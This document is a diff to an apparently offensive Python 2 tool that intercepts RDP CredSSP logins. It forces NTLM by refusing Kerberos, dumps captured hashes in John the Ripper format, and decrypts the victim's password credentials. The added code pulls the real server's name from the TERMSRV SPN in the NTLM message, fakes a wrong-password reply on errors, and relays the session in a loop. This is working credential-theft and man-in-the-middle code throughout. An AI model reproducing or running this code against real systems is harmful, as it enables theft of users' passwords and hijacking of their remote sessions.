@@ -37,6 +37,7 @@ sessionKey = b"\00"
 cipher = None
 Kerb = False
 tsp = TSPasswordCreds()
+server_dest = ''
 
 #Function to refuse Kerberos on SPNEGO
 def refuseKerberos(sock,buff,options):
@@ -50,21 +51,17 @@ def refuseKerberos(sock,buff,options):
         ts_request = TSRequest()
         ts_request.fromString(buff)
         print "envoi2"
-        print ts_request.fields
         NTLMRequest = getNTLMSSPType2(options.serverName, options.domain, options.dnsdomain)
         # Not Working !
         my_request['authInfo'] =  NTLMRequest.getData()
         my_request['Version'] =  1
         #Removing content of NegoData
         my_request['NegoData']=""
-        #my_request['NegoDataKerb'] = "i"
         my_request2 = TSRequest()
         my_request2['Version'] = options.CredSSP
-        #print ':'.join("{:02x}".format(ord(c)) for c in my_request.getKRBData())
         my_request2['NegoData'] = my_request.getKRBData()
         Kerb = True
         #print "Double Encoding"
-        #print ':'.join("{:02x}".format(ord(c)) for c in my_request2.getData())
         sock.send(my_request2.getData())
         #buff = sock.recv(4096)
 
@@ -87,7 +84,6 @@ def step1(sock,options):
             my_request = TSRequest()
             my_request['NegoData']= NTLMRequest.getData()
             my_request['Version'] = options.CredSSP
-            #print ':'.join("{:02x}".format(ord(c)) for c in my_request.getData())
             sock.send(my_request.getData())
         except Exception as e: print(e)
 
@@ -99,6 +95,7 @@ def step2(sock,options):
     global sessionKey
     global cipher
     global Kerb
+    global server_dest
     try:
         print "Receiving NTLM Response"
         #print ':'.join("{:02x}".format(ord(c)) for c in buff)
@@ -116,6 +113,9 @@ def step2(sock,options):
             print 'finished creating a authmessage'
 
         ntlm_hash_data = outputToJohnFormat(NTLMRequest['challenge'],authenticateMessage['user_name'],authenticateMessage['domain_name'],authenticateMessage['lanman'],authenticateMessage['ntlm'])
+
+        ind = authenticateMessage['ntlm'].find('T\x00E\x00R\x00M\x00S\x00R\x00V\x00/')
+        server_dest = authenticateMessage['ntlm'][ind+16::2]
         print ntlm_hash_data['hash_string']
         if options.outfile != None:
             F = open(options.outfile,'a')
@@ -137,11 +137,14 @@ def step2(sock,options):
          cipher = SPNEGOCipher(NTLMRequest['flags'] ,sessionKey)
          signature, cripted_key = cipher.clientEncrypt(clientRequest['pubKeyAuth'][16:])
          signature, cripted_key = cipher.serverEncrypt(h256.digest())
+         
         else:
             cipher = SPNEGOCipher(NTLMRequest['flags'] ,sessionKey)
             signature, plain = cipher.clientEncrypt(clientRequest['pubKeyAuth'][16:])
             pubKeyStr = chr(ord(pubKeyStr[0]) + 1) + pubKeyStr[1:]
             signature, cripted_key = cipher.serverEncrypt(pubKeyStr)
+
+        
 
         print "Prooving that we know Session Key"
         answer = TSRequest()
@@ -151,6 +154,12 @@ def step2(sock,options):
 
     except Exception as e:
         print(e)
+        raw_wrong_password = "\x30\x1b\xa0\x03\x02\x01\x06\xa1\x0c\x30\x0a\x30\x08\xa0\x06\x04\x04\x00\x00\x00\x00\xa4\x06\x02\x04\xc0\x00\x00\x6d"
+        sock.send(raw_wrong_password)
+
+
+
+
 
 def step3(sock,options):
     buff = sock.recv(4096)
@@ -176,11 +185,13 @@ def step3(sock,options):
         print e
 
 def step4(sock,options):
-    srvsocket = clientConnect(options.domainIP,tsp['userName'],tsp['password'],tsp['domainName'])
+    print server_dest
+    srvsocket = clientConnect(server_dest.rstrip('\x00'),tsp['userName'],tsp['password'],tsp['domainName'])
     print "connected to server"
-    sender(receiver(sock),srvsocket)
-    asyncore.loop()
-    time.sleep(10)
+    while True:
+        sender(receiver(sock),srvsocket)
+        asyncore.loop()
+        time.sleep(10)
 
 SPNEGOStep = {
         1: step1,
@@ -194,7 +205,6 @@ def SPNEGOHandler(sock,options):
         global currentStep
         SPNEGOStep[currentStep](sock,options)
         currentStep = currentStep + 1
-        print "next step ",currentStep
     except Exception as e:
         print 'exception raised'
         print e
